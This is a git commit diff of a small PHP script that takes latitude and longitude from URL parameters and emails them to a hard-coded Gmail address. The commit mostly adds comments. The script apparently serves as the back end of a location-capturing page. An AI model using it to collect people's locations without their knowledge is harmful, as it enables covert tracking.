d36cdce6c078d2809da6e820df5a6a836373c7a3
abosalem13 <168883480+abosalem13@users.noreply.github.com>
2024-05-04 07:06:29 +0300

    Update fg.php.php

--- fg.php.php
+++ fg.php.php
@@ -1,11 +1,20 @@
 <?php
+// Receiving data from the request
 $latitude = $_GET['lat'];
 $longitude = $_GET['long'];
 
-$to ="imobilejordan@gmail.com";
-$subject = "Location Information";
-$message = "Latitude: $latitude, Longitude: $longitude";
-$headers = "From:imobilejordan@gmail.com";
+// Email address to which you want to send the location
+$to = "imobilejordan@gmail.com";
 
+// Email subject
+$subject = "Location Information";
+
+// Email body containing the location data
+$message = "Latitude: $latitude, Longitude: $longitude";
+
+// Email address used for sending
+$headers = "From: your_email@example.com";
+
+// Sending the email
 mail($to, $subject, $message, $headers);
 ?>
